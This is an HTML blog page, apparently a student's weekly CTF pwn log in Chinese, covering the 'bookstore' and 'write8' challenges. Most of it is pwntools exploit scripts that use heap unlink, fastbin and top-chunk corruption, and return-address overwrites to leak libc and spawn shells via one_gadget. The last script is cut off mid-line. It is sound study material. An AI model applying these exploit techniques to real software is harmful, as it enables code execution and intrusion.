@@ -1,0 +1,300 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  
+  
+  <title>fifth week | Hexo</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+  <meta name="description" content="本周脱离 wp 生存的第一周,困难重重 铁三的 bookstore这题是自写函数的溢出,看似很简单,其实利用起来很难,我的思路是一个堆块复用实现各种泄漏,但是泄漏出来发现用不了,这个有一个很恶心的就是 12if ( (unsigned int)size &gt; 0x50 )  return puts(&quot;Too big!&quot;);  size 的限制,让我头皮发麻,我尝试了几种方案">
+<meta property="og:type" content="article">
+<meta property="og:title" content="fifth week">
+<meta property="og:url" content="http://example.com/2019/11/04/2019-11-04-5th_week/index.html">
+<meta property="og:site_name" content="Hexo">
+<meta property="og:description" content="本周脱离 wp 生存的第一周,困难重重 铁三的 bookstore这题是自写函数的溢出,看似很简单,其实利用起来很难,我的思路是一个堆块复用实现各种泄漏,但是泄漏出来发现用不了,这个有一个很恶心的就是 12if ( (unsigned int)size &gt; 0x50 )  return puts(&quot;Too big!&quot;);  size 的限制,让我头皮发麻,我尝试了几种方案">
+<meta property="og:locale" content="en_US">
+<meta property="article:published_time" content="2019-11-03T16:00:00.000Z">
+<meta property="article:modified_time" content="2023-08-07T18:15:52.000Z">
+<meta property="article:author" content="John Doe">
+<meta property="article:tag" content="pwn">
+<meta name="twitter:card" content="summary">
+  
+    <link rel="alternate" href="/atom.xml" title="Hexo" type="application/atom+xml">
+  
+  
+    <link rel="shortcut icon" href="/favicon.png">
+  
+  
+  
+<link rel="stylesheet" href="/css/style.css">
+
+  
+    
+<link rel="stylesheet" href="/fancybox/jquery.fancybox.min.css">
+
+  
+  
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/fork-awesome@1.2.0/css/fork-awesome.min.css">
+
+<meta name="generator" content="Hexo 8.0.0"></head>
+
+<body>
+  <div id="container">
+    <div id="wrap">
+      <header id="header">
+  <div id="banner"></div>
+  <div id="header-outer" class="outer">
+    <div id="header-title" class="inner">
+      <h1 id="logo-wrap">
+        <a href="/" id="logo">Hexo</a>
+      </h1>
+      
+    </div>
+    <div id="header-inner" class="inner">
+      <nav id="main-nav">
+        <a id="main-nav-toggle" class="nav-icon"><span class="fa fa-bars"></span></a>
+        
+          <a class="main-nav-link" href="/">Home</a>
+        
+          <a class="main-nav-link" href="/archives">Archives</a>
+        
+      </nav>
+      <nav id="sub-nav">
+        
+        
+          <a class="nav-icon" href="/atom.xml" title="RSS Feed"><span class="fa fa-rss"></span></a>
+        
+        <a class="nav-icon nav-search-btn" title="Search"><span class="fa fa-search"></span></a>
+      </nav>
+      <div id="search-form-wrap">
+        <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" class="search-form-input" placeholder="Search"><button type="submit" class="search-form-submit">&#xF002;</button><input type="hidden" name="sitesearch" value="http://example.com"></form>
+      </div>
+    </div>
+  </div>
+</header>
+
+      <div class="outer">
+        <section id="main"><article id="post-2019-11-04-5th_week" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-meta">
+    <a href="/2019/11/04/2019-11-04-5th_week/" class="article-date">
+  <time class="dt-published" datetime="2019-11-03T16:00:00.000Z" itemprop="datePublished">2019-11-04</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 class="p-name article-title" itemprop="headline name">
+      fifth week
+    </h1>
+  
+
+      </header>
+    
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+        <p>本周脱离 wp 生存的第一周,困难重重</p>
+<h2 id="铁三的-bookstore"><a href="#铁三的-bookstore" class="headerlink" title="铁三的 bookstore"></a>铁三的 bookstore</h2><p>这题是自写函数的溢出,看似很简单,其实利用起来很难,我的思路是一个堆块复用实现各种泄漏,但是泄漏出来发现用不了,这个有一个很恶心的就是</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">if ( (unsigned int)size &gt; 0x50 )</span><br><span class="line">  return puts(&quot;Too big!&quot;);</span><br></pre></td></tr></table></figure>
+
+<p>size 的限制,让我头皮发麻,我尝试了几种方案都没有好的办法,最后只能 unlink 了,没办法,我一会试着写下 wp ,现在写一下目前的心路历程</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">p = process(&#x27;./bookstore&#x27;)</span><br><span class="line">elf = ELF(&quot;./bookstore&quot;, checksec=False)</span><br><span class="line">libc = ELF(&#x27;/lib/x86_64-linux-gnu/libc-2.23.so&#x27;, checksec=False)</span><br><span class="line">context.log_level = &quot;debug&quot;</span><br><span class="line">def new(auname,size,boname):</span><br><span class="line">	p.sendlineafter(&#x27;Your choice:\n&#x27;,&#x27;1&#x27;)</span><br><span class="line">	p.sendlineafter(&#x27;What is the author name?\n&#x27;,auname)</span><br><span class="line">	p.sendlineafter(&#x27;How long is the book name?\n&#x27;,str(size))</span><br><span class="line">	p.sendlineafter(&#x27;What is the name of the book?\n&#x27;,boname)</span><br><span class="line">def free(ind):</span><br><span class="line">	p.sendlineafter(&#x27;Your choice:\n&#x27;,&#x27;2&#x27;)</span><br><span class="line">	p.sendlineafter(&#x27;Which book do you want to sell?&#x27;,str(ind))</span><br><span class="line">def show(ind):</span><br><span class="line">	p.sendlineafter(&#x27;Your choice:\n&#x27;,&#x27;3&#x27;)</span><br><span class="line">	p.sendlineafter(&#x27;Which book do you want to sell?&#x27;,str(ind))</span><br><span class="line"></span><br><span class="line">new(&#x27;0&#x27;,0,&#x27;0&#x27;)</span><br><span class="line">new(&#x27;1&#x27;,0,&#x27;1&#x27;)</span><br><span class="line">new(&#x27;2&#x27;,0,&#x27;2&#x27;)</span><br><span class="line">new(&#x27;3&#x27;,0,&#x27;3&#x27;)</span><br><span class="line">new(&#x27;4&#x27;,0,&#x27;4&#x27;)</span><br><span class="line">new(&#x27;5&#x27;,0,&#x27;5&#x27;)</span><br><span class="line">new(&#x27;6&#x27;,0,&#x27;6&#x27;)</span><br><span class="line">new(&#x27;7&#x27;,0,&#x27;7&#x27;)</span><br><span class="line">new(&#x27;8&#x27;,0,&#x27;8&#x27;)</span><br><span class="line">free(0)</span><br><span class="line">pay = p64(0)*3+p64(0xa1)</span><br><span class="line">new(&#x27;0&#x27;,0,pay)</span><br><span class="line">free(6)</span><br><span class="line">pay = p64(0)*2+p64(0xa0)+p64(0x21)</span><br><span class="line">new(&#x27;0&#x27;,0,pay)</span><br><span class="line">free(1)</span><br><span class="line">new(&#x27;0&#x27;,10,&#x27;1&#x27;*8)</span><br><span class="line">show(1)</span><br><span class="line">p.recvuntil(&#x27;1&#x27;*8)</span><br><span class="line">leak = u64(p.recvuntil(&#x27;\n&#x27;)[:-1].ljust(8,&#x27;\x00&#x27;))</span><br><span class="line">libc_base = leak-0x3c4c08</span><br><span class="line">print hex(libc_base)</span><br><span class="line">new(&#x27;0&#x27;,10,&#x27;9&#x27;*8)</span><br><span class="line">free(4)</span><br><span class="line">free(9)</span><br><span class="line">show(2)</span><br><span class="line">p.recvuntil(&#x27;Bookname:&#x27;)</span><br><span class="line">heap = u64(p.recvuntil(&#x27;\n&#x27;)[:-1].ljust(8,&#x27;\x00&#x27;))</span><br><span class="line">heap_base = heap-0x80</span><br><span class="line"></span><br><span class="line">print hex(heap_base)</span><br><span class="line"></span><br><span class="line">new(&#x27;0&#x27;,0x50,&#x27;4&#x27;)</span><br><span class="line">new(&#x27;0&#x27;,0x40,&#x27;9&#x27;)</span><br><span class="line">new(&#x27;0&#x27;,0x10,&#x27;a&#x27;)</span><br><span class="line">new(&#x27;0&#x27;,0x40,&#x27;b&#x27;)</span><br><span class="line">new(&#x27;0&#x27;,0x10,&#x27;c&#x27;)</span><br><span class="line">new(&#x27;0&#x27;,0x10,&#x27;d&#x27;)</span><br><span class="line">free(7)</span><br><span class="line">new(&#x27;0&#x27;,0,&#x27;0&#x27;)</span><br><span class="line">## 8 b</span><br><span class="line">free(11)</span><br><span class="line">free(9)</span><br><span class="line">mall = libc_base + libc.symbols[&#x27;__malloc_hook&#x27;]-0x23</span><br><span class="line"></span><br><span class="line">free_hook = libc.symbols[&#x27;__free_hook&#x27;] + libc_base</span><br><span class="line">print hex(mall)</span><br><span class="line">free(8)</span><br><span class="line">new(&#x27;0&#x27;,0,&#x27;c&#x27;*10)</span><br><span class="line">gdb.attach(p)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+<p>全在这 wp 里了,哭了~~~ 发现 unlink 也不行,不能 edit ,很恶心~~~ 就完成了 unlink 到 bss 端,但是无法利用~~~</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">p = process(&#x27;./bookstore&#x27;)</span><br><span class="line">elf = ELF(&quot;./bookstore&quot;, checksec=False)</span><br><span class="line">libc = ELF(&#x27;/lib/x86_64-linux-gnu/libc-2.23.so&#x27;, checksec=False)</span><br><span class="line">context.log_level = &quot;debug&quot;</span><br><span class="line">def new(size,boname):</span><br><span class="line">	p.sendlineafter(&#x27;Your choice:\n&#x27;,&#x27;1&#x27;)</span><br><span class="line">	p.sendlineafter(&#x27;What is the author name?\n&#x27;,p64(elf.got[&#x27;free&#x27;])*3)</span><br><span class="line">	p.sendlineafter(&#x27;How long is the book name?\n&#x27;,str(size))</span><br><span class="line">	p.sendlineafter(&#x27;What is the name of the book?\n&#x27;,boname)</span><br><span class="line">def free(ind):</span><br><span class="line">	p.sendlineafter(&#x27;Your choice:\n&#x27;,&#x27;2&#x27;)</span><br><span class="line">	p.sendlineafter(&#x27;Which book do you want to sell?&#x27;,str(ind))</span><br><span class="line">def show(ind):</span><br><span class="line">	p.sendlineafter(&#x27;Your choice:\n&#x27;,&#x27;3&#x27;)</span><br><span class="line">	p.sendlineafter(&#x27;Which book do you want to sell?&#x27;,str(ind))</span><br><span class="line"></span><br><span class="line">new(0,&#x27;0&#x27;)</span><br><span class="line">new(0x30,&#x27;1&#x27;)</span><br><span class="line">new(0x40,&#x27;2&#x27;)</span><br><span class="line">new(0x30,&#x27;3&#x27;)</span><br><span class="line">new(0x40,&#x27;4&#x27;)</span><br><span class="line">new(0,&#x27;5&#x27;)</span><br><span class="line">free(0)</span><br><span class="line">pay = p64(0)*3+p64(0x91)+p64(0)+p64(0x81)+p64(0x602080+0x10)+p64(0x602080+0x18)</span><br><span class="line">pay = pay.ljust(0xa0,&#x27;\x00&#x27;)+p64(0x80)+p64(0x90)</span><br><span class="line">new(0,pay)</span><br><span class="line">free(3)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">p = process(&#x27;./bookstore&#x27;)</span><br><span class="line">elf = ELF(&quot;./bookstore&quot;, checksec=False)</span><br><span class="line">libc = ELF(&#x27;/lib/x86_64-linux-gnu/libc-2.23.so&#x27;, checksec=False)</span><br><span class="line">context.log_level = &quot;debug&quot;</span><br><span class="line">def new(size,boname):</span><br><span class="line">	p.sendlineafter(&#x27;Your choice:\n&#x27;,&#x27;1&#x27;)</span><br><span class="line">	p.sendlineafter(&#x27;What is the author name?\n&#x27;,&#x27;1&#x27;)</span><br><span class="line">	p.sendlineafter(&#x27;How long is the book name?\n&#x27;,str(size))</span><br><span class="line">	p.sendlineafter(&#x27;What is the name of the book?\n&#x27;,boname)</span><br><span class="line">def free(ind):</span><br><span class="line">	p.sendlineafter(&#x27;Your choice:\n&#x27;,&#x27;2&#x27;)</span><br><span class="line">	p.sendlineafter(&#x27;Which book do you want to sell?&#x27;,str(ind))</span><br><span class="line">def show(ind):</span><br><span class="line">	p.sendlineafter(&#x27;Your choice:\n&#x27;,&#x27;3&#x27;)</span><br><span class="line">	p.sendlineafter(&#x27;Which book do you want to sell?&#x27;,str(ind))</span><br><span class="line"></span><br><span class="line">new(0,&#x27;0&#x27;)</span><br><span class="line">new(0x50,&#x27;1&#x27;)</span><br><span class="line">new(0x50,&#x27;2&#x27;)</span><br><span class="line">new(0x50,&#x27;3&#x27;)</span><br><span class="line">new(0,&#x27;4&#x27;)</span><br><span class="line">new(0x50,&#x27;5&#x27;)</span><br><span class="line">new(0,&#x27;6&#x27;)</span><br><span class="line">new(0x40,&#x27;7&#x27;)</span><br><span class="line">new(0,&#x27;8&#x27;)</span><br><span class="line">free(0)</span><br><span class="line">new(0,p64(0)*3+p64(0xc1))</span><br><span class="line">free(1)</span><br><span class="line">new(0,&#x27;a&#x27;*8)</span><br><span class="line">show(1)</span><br><span class="line">p.recvuntil(&#x27;a&#x27;*8)</span><br><span class="line">leak = u64(p.recvuntil(&#x27;\n&#x27;)[:-1].ljust(8,&#x27;\x00&#x27;))</span><br><span class="line">print hex(leak)</span><br><span class="line">base = leak - 3951656</span><br><span class="line">one = base+ 0x4526a</span><br><span class="line">free(6)</span><br><span class="line">free(7)</span><br><span class="line">new(0,p64(0x6)*3+p64(0x51)+p64(0x61))</span><br><span class="line">new(0x40,&#x27;7&#x27;)</span><br><span class="line">free(4)</span><br><span class="line">free(5)</span><br><span class="line">new(0,p64(0x0)*3+p64(0x61)+p64(leak-184-56))</span><br><span class="line">new(0x50,&#x27;5&#x27;)</span><br><span class="line">new(0x50,p64(0x0)*6+p64(leak-184-56-64))</span><br><span class="line">new(0x50,&#x27;123&#x27;)</span><br><span class="line">new(0x50,p64(0)+p64(one))</span><br><span class="line"></span><br><span class="line">p.sendline(&#x27;1&#x27;)</span><br><span class="line">p.sendline(&#x27;xxxx&#x27;)</span><br><span class="line">p.sendline(&#x27;30&#x27;)</span><br><span class="line"></span><br><span class="line">#gdb.attach(p)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+<p>学到了好多,这个比较粗糙,但还是要认真记录一下,首先这个思路就太狠了,和之前做过的一道题贼像,这个是把 top_chunk 给改了,而且手法好骚啊</p>
+<p><code>new(0,p64(0x6)*3+p64(0x51)+p64(0x61))</code> 先把比目标 bin 小 0x10 个字节的给改了,这样伪造为之后的 malloc 提供方便</p>
+<h2 id="吉林省网络安全大赛-write8"><a href="#吉林省网络安全大赛-write8" class="headerlink" title="吉林省网络安全大赛 write8"></a>吉林省网络安全大赛 write8</h2><p>比赛的时候刚接触 pwn ,洞都没看,就直接放了,现在突然看到了,做一下,发现不难 orz</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"># coding=utf-8</span><br><span class="line">from pwn import *</span><br><span class="line">p=process(&#x27;./write8&#x27;,aslr=2)</span><br><span class="line">#context.log_level = &quot;debug&quot;</span><br><span class="line">p.recvuntil(&#x27;name?\n&#x27;)</span><br><span class="line">p.send(&#x27;a&#x27;*16)</span><br><span class="line">p.recvuntil(&#x27;a&#x27;*16)</span><br><span class="line">leak = u32(p.recvuntil(&#x27;write&#x27;)[:4].ljust(4,&#x27;\x00&#x27;))</span><br><span class="line">print hex(leak)</span><br><span class="line">leak_real=leak-66</span><br><span class="line">p.recvuntil(&#x27;Tell me where is your favorite\n&#x27;)</span><br><span class="line">p.sendline(hex(leak_real)[2:])</span><br><span class="line">sleep(0.1)</span><br><span class="line">main_addr=0x080485F6</span><br><span class="line">p.send(p32(main_addr))</span><br><span class="line"></span><br><span class="line">p.send(&#x27;a&#x27;*28)</span><br><span class="line">p.recvuntil(&#x27;a&#x27;*28)</span><br><span class="line">libc_base = u32(p.recvuntil(&#x27;write&#x27;)[:4])-377150</span><br><span class="line">print hex(libc_base)</span><br><span class="line">leak_real=leak-210</span><br><span class="line">p.sendline(hex(leak_real)[2:])</span><br><span class="line">sleep(0.1)</span><br><span class="line">#gdb.attach(p,&#x27;b*0x80485EB&#x27;)</span><br><span class="line">one = 0x5fbc6 + libc_base</span><br><span class="line">p.send(p32(one)+p32(0))</span><br><span class="line">#pause()</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+<p>这里的漏洞就是一个任意地址写,思路还是很清楚的,就是覆盖返回地址,上述 wp 的思路就是</p>
+<ul>
+<li>main 第一次泄漏 stack</li>
+<li>write8 直接往 ret 里放 main_addr ,因为泄漏一个远远不够</li>
+<li>到 main_addr 后泄漏 libc_base</li>
+<li>到 write8 后 ret 放 one_gadget ,这里用了一个骚思路(这里我们只能控制 8 个字节</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">pic$ one_gadget /lib/i386-linux-gnu/libc.so.6</span><br><span class="line">0x3ac5c execve(&quot;/bin/sh&quot;, esp+0x28, environ)</span><br><span class="line">constraints:</span><br><span class="line">  esi is the GOT address of libc</span><br><span class="line">  [esp+0x28] == NULL</span><br><span class="line"></span><br><span class="line">0x3ac5e execve(&quot;/bin/sh&quot;, esp+0x2c, environ)</span><br><span class="line">constraints:</span><br><span class="line">  esi is the GOT address of libc</span><br><span class="line">  [esp+0x2c] == NULL</span><br><span class="line"></span><br><span class="line">0x3ac62 execve(&quot;/bin/sh&quot;, esp+0x30, environ)</span><br><span class="line">constraints:</span><br><span class="line">  esi is the GOT address of libc</span><br><span class="line">  [esp+0x30] == NULL</span><br><span class="line"></span><br><span class="line">0x3ac69 execve(&quot;/bin/sh&quot;, esp+0x34, environ)</span><br><span class="line">constraints:</span><br><span class="line">  esi is the GOT address of libc</span><br><span class="line">  [esp+0x34] == NULL</span><br><span class="line"></span><br><span class="line">0x5fbc5 execl(&quot;/bin/sh&quot;, eax)</span><br><span class="line">constraints:</span><br><span class="line">  esi is the GOT address of libc</span><br><span class="line">  eax == NULL</span><br><span class="line"></span><br><span class="line">0x5fbc6 execl(&quot;/bin/sh&quot;, [esp])</span><br><span class="line">constraints:</span><br><span class="line">  esi is the GOT address of libc</span><br><span class="line">  [esp] == NULL</span><br></pre></td></tr></table></figure>
+
+<p>最后一个刚刚好,直接暴力填入 0 完事, one_gadget 绝对成立~~~~ 巧了不是</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"># coding=utf-8</span><br><span class="line">from pwn import *</span><br><span class="line">#p=process(&#x27;./write8&#x27;,aslr=2)</span><br><span class="line">p=process(&#x27;./write8&#x27;,env=&#123;&#x27;LD_PRELOAD&#x27;:&#x27;./libc.so.6&#x27;&#125;)</span><br><span class="line">#context.log_level = &quot;debug&quot;</span><br><span class="line">p.recvuntil(&#x27;name?\n&#x27;)</span><br><span class="line">p.send(&#x27;a&#x27;*16)</span><br><span class="line">p.recvuntil(&#x27;a&#x27;*16)</span><br><span class="line">leak = u32(p.recvuntil(&#x27;write&#x27;)[:4].ljust(4,&#x27;\x00&#x27;))</span><br><span class="line">print hex(leak)</span><br><span class="line">leak_real=leak-66</span><br><span class="line">p.recvuntil(&#x27;Tell me where is your favorite\n&#x27;)</span><br><span class="line">p.sendline(hex(leak_real)[2:])</span><br><span class="line">sleep(0.1)</span><br><span class="line">main_addr=0x080485F6</span><br><span class="line">p.send(p32(main_addr))</span><br><span class="line"></span><br><span class="line">p.send(&#x27;a&#x27;*28)</span><br><span class="line">p.recvuntil(&#x27;a&#x27;*28)</span><br><span class="line">libc_base = u32(p.recvuntil(&#x27;write&#x27;)[:4])-377150</span><br><span class="line">print hex(libc_base)</span><br><span class="line">leak_real=leak-210</span><br><span class="line">p.sendline(hex(leak_real)[2:])</span><br><span class="line">sleep(0.1)</span><br><span class="line">gdb.attach(p,&#x27;b*0x80485EB&#x27;)</span><br><span class="line">one = 0x5f066 + libc_base+0xb10</span><br><span class="line">p.send(p32(one)+p32(0))</span><br><span class="line">pause()</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+<p>上述为题目环境,差了 0xb10 个字节,还好	官方是一个栈迁移,我看看</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">import sys</span><br><span class="line">debug = 1</span><br><span class="line">arch_64 = 0</span><br><span class="line">exe = &quot;./write8&quot;</span><br><span class="line">r = lambda x:p.recv(x)</span><br><span class="line">ru = lambda x:p.recvuntil(x)</span><br><span class="line">rud = lambda x:p.recvuntil(x,drop=True)</span><br><span class="line">sd = lambda x:p.send(x)</span><br><span class="line">sl = lambda x:p.sendline(x)</span><br><span class="line">sea = lambda x:p.sendafter(x)</span><br><span class="line">sela = lambda x:p.sendlineafter(x)</span><br><span class="line">context.terminal = [&quot;tmux&quot;,&quot;splitw&quot;,&quot;-h&quot;]</span><br><span class="line">e = ELF(exe)</span><br><span class="line">if debug:</span><br><span class="line">	context.log_level = &quot;debug&quot;</span><br><span class="line">def rl():</span><br><span class="line">	p.recvline()</span><br><span class="line">if len(sys.argv)&gt;1:</span><br><span class="line">	p = remote(sys.argv[1],int(sys.argv[2]))</span><br><span class="line">	libc = ELF(&quot;./libc.so.6&quot;)</span><br><span class="line">else:</span><br><span class="line">	p = process([exe])</span><br><span class="line">if arch_64:</span><br><span class="line">	libc = ELF(&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;)</span><br><span class="line">	arena = 0x3c4b20</span><br><span class="line">	context.arch = &quot;amd64&quot;</span><br><span class="line">else:</span><br><span class="line">	libc = ELF(&quot;/lib/i386-linux-gnu/libc.so.6&quot;)</span><br><span class="line">	arena = 0x1b2780</span><br><span class="line">	context.arch = &quot;i386&quot;</span><br><span class="line">def csu(offset,end,front,fun_got,arg1,arg2,arg3):</span><br><span class="line">	tmp = flat([&quot;A&quot;*offset,end,0,1,fun_got,arg3,arg2,arg1,front,&quot;A&quot;*0x38,vul])</span><br><span class="line">	return tmp</span><br><span class="line">def z():</span><br><span class="line">	gdb.attach(p)</span><br><span class="line">def write(addr,data):</span><br><span class="line">	print &quot;writing &quot;+hex(addr)+&quot; : &quot;+data</span><br><span class="line">	ru(&quot;favorite\n&quot;)</span><br><span class="line">	sl(hex(addr)[2:])</span><br><span class="line">	rl()</span><br><span class="line">	sd(data)</span><br><span class="line">main = e.symbols[&quot;main&quot;]</span><br><span class="line">puts_plt = e.plt[&quot;puts&quot;]</span><br><span class="line">puts_got = e.got[&quot;puts&quot;]</span><br><span class="line">p1=flat([puts_plt,main,puts_got])</span><br><span class="line">p1+=&quot;A&quot;*0x8</span><br><span class="line">rl()</span><br><span class="line">sd(p1)</span><br><span class="line">ru(&quot;A&quot;*0x8)</span><br><span class="line">stack = u32(r(4))</span><br><span class="line">print &quot;stack: &quot;+hex(stack)</span><br><span class="line">ret = stack - 0x140</span><br><span class="line">rop_addr = stack - 0x140</span><br><span 